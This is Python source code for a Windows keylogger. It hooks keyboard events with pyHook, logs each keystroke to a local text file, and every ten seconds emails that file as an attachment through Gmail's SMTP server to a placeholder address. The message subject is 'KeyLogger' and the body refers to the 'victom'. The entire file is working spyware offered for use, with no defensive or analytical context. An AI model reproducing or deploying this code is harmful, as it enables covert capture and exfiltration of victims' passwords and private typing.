from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email import encoders
import pyHook
import pythoncom
import logging,sys
import smtplib,threading,datetime,time

file_path = "C:/Users/Devil/Desktop/catch.txt"#filepath
format_path = " %(asctime)s %(message)s"#formating the message and time

def onKeyboardEvent(event):#function for keyboard manager
    logging.basicConfig(filename = file_path,level = logging.DEBUG,format = format_path,filemode='w')#logging the basic configuration
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

def pump():
    hm = pyHook.HookManager()#craeting the a manager
    hm.KeyDown = onKeyboardEvent#
    hm.HookKeyboard()#
    pythoncom.PumpMessages()#dump the message in the file

today = datetime.datetime.today()
fromadd ="FROM ADDRESS"
toadd = "To ADDRESS"

def attack():
    while True:
        time.sleep(10)#time to wake up
        msg = MIMEMultipart()
        msg["From"] = fromadd
        msg["To"] = toadd
        msg["Subject"]="KeyLogger"
        body = "file from victom{date}".format(date=today)
        msg.attach(MIMEText(body,"plain"))#plain message
        p = MIMEBase("application","octet-stream")
        p.set_payload(open(file_path,'rb').read())#attach the file
        encoders.encode_base64(p)#encode with the 64 base
        p.add_header('content-Disposition',"attachment; filename=%s"%file_path)
        msg.attach(p)
        mail = msg.as_string()
        server = smtplib.SMTP("smtp.gmail.com","587")
        server.ehlo()
        server.starttls()
        server.login("USERNAME","PASSWORD")
        server.sendmail(fromadd,toadd,mail)
        server.quit()


t = threading.Thread(target = pump)
t2 = threading.Thread(target = attack)

t.start()
t2.start()
